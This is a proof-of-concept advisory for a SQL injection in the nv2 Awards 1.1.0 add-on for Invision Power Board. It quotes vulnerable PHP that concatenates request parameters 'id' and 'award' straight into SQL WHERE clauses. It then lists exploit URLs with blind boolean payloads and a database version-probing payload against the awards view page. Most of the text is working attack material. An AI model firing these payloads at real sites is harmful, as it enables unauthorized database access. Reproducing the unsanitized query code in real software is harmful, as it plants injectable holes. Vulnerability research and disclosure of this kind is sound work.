IPB (nv2) Awards > 1.1.0 SQL Injection PoC
==========================================

#################################################
+
+  Author:      fred777 - [fred777.de]
+  Link:          http://forums.invisionize.com/nv2-Awards-120-t137847.html
+  Vuln:         index.php?autocom=awards&do=view&id=1
+
#################################################
 
--[ Vuln Code ] --
 
$this->ipsclass->DB->build_query( array( &#039;select&#039; => &#039;a.user_id&#039;,
                                                   &#039;from&#039; => array( &#039;awarded&#039; => &#039;a&#039; ),
                      &#039;where&#039; => &#039;a.award_id=&#039; . $this->ipsclass->input[&#039;id&#039;],
                      &#039;add_join&#039; => array( 0 => array( &#039;select&#039; => &#039;m.members_display_name&#039;,
                      &#039;from&#039; => array( &#039;members&#039; => &#039;m&#039; ),
                        &#039;where&#039; => &#039;m.id=a.user_id&#039;,
                          &#039;type&#039; => &#039;left&#039;,
                                                                                 ) ),
                      ) );
 
--------------------------------------------------------------------------------------
 
        &#039;select&#039; => &#039;*&#039;,
        &#039;from&#039; => &#039;awards&#039;,
        &#039;where&#039; => &#039;id = "&#039; . $_POST[&#039;award&#039;] . &#039;"&#039;,
        ) );
 
--------------------------------------------------------------------------------------
 
        $award_dat[&#039;user_id&#039;] = $_GET[&#039;id&#039;];
        $award_dat[&#039;award_id&#039;] = $_POST[&#039;award&#039;];
 
################################################
 
--[ Exploitable ]--
 
http://server/index.php?autocom=awards&do=view&id=1[SQL INJECTION]
 
http://server/index.php?autocom=awards&do=view&id=1+and+1=1 > true
http://server/index.php?autocom=awards&do=view&id=1+and+1=0 > false
 
http://server/index.php?autocom=awards&do=view&id=1+and+substring(version(),1,1)=5
http://server/index.php?autocom=awards&do=view&id=1+and+substring(version(),1,1)=4
 
################################################



